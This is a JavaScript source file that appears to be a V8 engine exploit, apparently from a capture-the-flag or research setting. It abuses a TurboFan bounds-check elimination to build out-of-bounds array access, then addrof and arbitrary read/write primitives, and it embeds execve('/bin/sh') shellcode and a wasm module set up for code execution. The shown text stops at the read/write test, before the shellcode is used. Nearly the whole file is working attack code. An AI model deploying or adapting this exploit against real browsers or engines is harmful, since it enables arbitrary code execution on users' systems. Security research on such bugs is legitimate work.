/* constants */

const kArgumentsBits = 16;
const kMaxArguments = (1 << kArgumentsBits) - 2; // 0xfffe

const kTurbofanInvocationCount = 100000; // invocation count for triggering turbofan compilation

const kBigIntSize = 8; // size of bigint

const kOOBArrLength = 0x1000; // new length of oob_arr

const wasm_src = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 4, 1, 2, 0, 11]; // wat2wasm pwn.wat

const kJumpTableStartOffset = 0x60; // offset of jump_table_start in WasmInstanceObject
const kBackingStoreOffset = 0x1c; // offset of backing_store in JSArrayBuffer

// execve("/bin/sh", 0, 0)
const shellcode = [72, 191, 47, 98, 105, 110, 47, 115, 104, 0, 87, 72, 137, 231, 72, 49, 246, 72, 49, 210, 72, 49, 192, 176, 59, 15, 5]; // shellcode.py

/* --------- */


/* helpers */

// compile function with turbofan
function compileTurbofan(f, args = []) { for (let i = 0; i < kTurbofanInvocationCount; i++) { f(...args); } }

let fi_buf = new ArrayBuffer(kBigIntSize); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// apply pointer tagging
function tag(ptr) { return ptr | 0x1n; }

// remove pointer tagging
function untag(ptr) { return ptr & 0xfffffffffffffffen; }

// convert integer to hex form
function hex(i) { return `0x${i.toString(16)}`; }

/* ------- */


/* implement exploit primitives */

let oob_arr;
let oob_arr_length = itof(BigInt(kOOBArrLength) << 32n);
let tmp_obj = {};
let obj_arr;
let rw_arr;

function layout() {
    let idx = arguments.length >> kArgumentsBits; // optimised to 0

    // overwrite length of oob_arr
    oob_arr = [1.1]; // idx is always smaller than oob_arr.length
    oob_arr[idx * 4] = oob_arr_length; // CheckBounds is optimised out

    obj_arr = [tmp_obj];
    rw_arr = new BigUint64Array(1);
}

// obtain oob array
compileTurbofan(layout);
layout(...new Array(1 << kArgumentsBits));
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`); // expected: kOOBArrLength

// find index of obj_arr[0] from oob_arr
let obj_idx = 0;
for (; ; obj_idx++) {
    if (Number(ftoi(oob_arr[obj_idx]) >> 32n) == obj_arr.length) {
        obj_idx++;
        break;
    }
}

// get address of obj
function addrof(obj) {
    obj_arr[0] = obj;
    return untag(ftoi(oob_arr[obj_idx]));
}

// addrof test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] tmp_obj_addr == ${hex(tmp_obj_addr)}`);
% DebugPrint(tmp_obj);

// find indices of data pointers of rw_arr from oob_arr
let ext_idx = obj_idx;
for (; ; ext_idx++) {
    if (ftoi(oob_arr[ext_idx]) == 0x1fn) {
        break;
    }
}
let base_idx = ext_idx - 1;

// read 8-byte from addr if value isn't provided, write value to addr otherwise
function rw(addr, value = NaN) {
    // overwrite data pointers
    oob_arr[base_idx] = itof(addr); // base_pointer
    oob_arr[ext_idx] = itof(0n); // external_pointer

    if (Number.isNaN(value)) { // read
        return rw_arr[0];
    } else { // write
        rw_arr[0] = value;
    }
}

// rw test
console.log(hex(rw(tmp_obj_addr)));

/* ---------------------------- */